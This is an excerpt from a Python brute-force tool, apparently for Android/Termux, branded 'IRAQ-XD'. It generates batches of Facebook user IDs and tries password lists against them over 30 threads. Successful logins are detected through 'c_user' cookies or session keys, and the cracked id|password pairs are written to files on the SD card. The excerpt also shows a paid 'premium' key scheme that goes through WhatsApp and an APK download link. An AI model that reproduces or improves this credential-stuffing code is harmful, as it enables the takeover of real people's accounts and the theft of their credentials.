        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/IRAQ_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        print("\033[1;31m Your Premium User...!\033[1;37m");time.sleep(1)
                        clear()
                        ...
                        linex()
                        tks = ("Hi IRAQ Sir, I Need To Buy Your Paid IRAQ PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python IRAQ.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as IRAQ:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [IRAQ-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        IRAQ=session.cookies.get_dict().keys()
                        if "c_user" in IRAQ:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [IRAQ-OK] %s | %s'%(ids,pas))
                                open('/sdcard/IRAQ-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in IRAQ:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [IRAQ-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/IRAQ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [IRAQ-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/IRAQ-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/IRAQ-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [IRAQ-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/IRAQ-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [IRAQ-OK] '+uid+' | '+pas+'\033[1;97m')
